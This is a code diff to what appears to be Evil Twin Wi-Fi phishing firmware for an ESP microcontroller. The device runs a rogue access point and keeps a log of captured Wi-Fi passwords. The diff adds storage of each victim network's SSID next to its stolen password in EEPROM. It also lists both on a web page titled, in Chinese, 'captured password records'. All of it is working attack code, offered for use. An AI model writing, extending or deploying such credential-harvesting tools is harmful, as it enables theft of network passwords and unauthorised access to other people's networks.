@@ -9,15 +9,16 @@
 #define RESET_PIN      0            /* GPIO0 – Flash button  */
 #define RESET_HOLD_MS  3000
 #define DNS_PORT       53
-#define EE_SIZE        1024
+#define EE_SIZE        1500
 #define PWD_MAX_LEN    64           /* max password length stored        */
 #define PWD_MAX_HISTORY 10
 
 /* EEPROM layout: BSSID(6) + SSID(33) + CH(1) = 40 B
    History: HeadIndex(1) + 10 * PWD(64) = 641 B. Total = 681 B
    Setup Pwd: 64 B. Offset = 681
-   Setup SSID: 33 B. Offset = 745 */
-enum { EE_BSSID = 0, EE_SSID = 6, EE_CH = 39, EE_PWD_HEAD = 40, EE_PWD_DATA = 41, EE_SETUP_PWD = 681, EE_SETUP_SSID = 745 };
+   Setup SSID: 33 B. Offset = 745
+   History SSID: 10 * SSID(33) = 330 B. Offset = 778 */
+enum { EE_BSSID = 0, EE_SSID = 6, EE_CH = 39, EE_PWD_HEAD = 40, EE_PWD_DATA = 41, EE_SETUP_PWD = 681, EE_SETUP_SSID = 745, EE_PWD_SSID_DATA = 778 };
 
 /* ================================================================== */
 IPAddress           apIP(192, 168, 4, 1);
@@ -31,6 +32,7 @@ static bool         attacking;
 static bool         capturedFlag;              /* password was captured     */
 static unsigned long capturedMs;
 static char         pwdHistory[PWD_MAX_HISTORY][PWD_MAX_LEN + 1]; /* all passwords */
+static char         pwdHistorySSID[PWD_MAX_HISTORY][33];          /* corresponding SSIDs */
 static int          pwdCount = 0;              /* number of valid passwords */
 static char         setupPwd[PWD_MAX_LEN + 1] = "12345678";
 static char         setupSSID[33] = "EvilTwin-Setup";
@@ -142,6 +144,14 @@ static void savePwd(const char *pwd)
     for (int i = len; i < PWD_MAX_LEN; i++)
         EEPROM.write(offset + i, 0x00);
         
+    int offsetSSID = EE_PWD_SSID_DATA + head * 33;
+    int lenSSID = strlen(targetSSID);
+    if (lenSSID > 32) lenSSID = 32;
+    for (int i = 0; i < lenSSID; i++)
+        EEPROM.write(offsetSSID + i, (uint8_t)targetSSID[i]);
+    for (int i = lenSSID; i < 33; i++)
+        EEPROM.write(offsetSSID + i, 0x00);
+        
     head = (head + 1) % PWD_MAX_HISTORY;
     EEPROM.write(EE_PWD_HEAD, head);
     EEPROM.commit();
@@ -161,15 +171,29 @@ static void loadPwd(void)
     for (int i = 0; i < PWD_MAX_HISTORY; i++) {
         int idx = (head - 1 - i + PWD_MAX_HISTORY) % PWD_MAX_HISTORY;
         int offset = EE_PWD_DATA + idx * PWD_MAX_LEN;
+        int offsetSSID = EE_PWD_SSID_DATA + idx * 33;
         
         char tmp[PWD_MAX_LEN + 1];
         for (int j = 0; j < PWD_MAX_LEN; j++)
             tmp[j] = (char)EEPROM.read(offset + j);
         tmp[PWD_MAX_LEN] = '\0';
         
+        char tmpS[33];
+        for (int j = 0; j < 33; j++)
+            tmpS[j] = (char)EEPROM.read(offsetSSID + j);
+        tmpS[32] = '\0';
+        
         if ((uint8_t)tmp[0] != 0xFF && tmp[0] != '\0') {
             strncpy(pwdHistory[pwdCount], tmp, PWD_MAX_LEN);
             pwdHistory[pwdCount][PWD_MAX_LEN] = '\0';
+            
+            if ((uint8_t)tmpS[0] != 0xFF && tmpS[0] != '\0') {
+                strncpy(pwdHistorySSID[pwdCount], tmpS, 32);
+                pwdHistorySSID[pwdCount][32] = '\0';
+            } else {
+                strcpy(pwdHistorySSID[pwdCount], "未知网络");
+            }
+            
             pwdCount++;
         }
     }
@@ -484,10 +508,12 @@ static void onConfigRoot(void)
     if (pwdCount > 0) {
         html += F("<div class='pwd-box'><h3>&#128273; 已捕获密码记录</h3>");
         for (int i = 0; i < pwdCount; i++) {
-            html += F("<div class='pwd-item'><div class='pwd-val'>");
+            html += F("<div class='pwd-item' style='flex-direction:column;align-items:flex-start;'><div style='width:100%;display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;'><div class='pwd-val'>");
             html += pwdHistory[i];
             html += F("</div><div class='pwd-idx'>");
             html += (i == 0 ? "最新" : String(i + 1));
+            html += F("</div></div><div style='font-size:12px;color:#28a745;font-weight:600;'>📺 ");
+            html += pwdHistorySSID[i];
             html += F("</div></div>");
         }
         html += F("</div>");
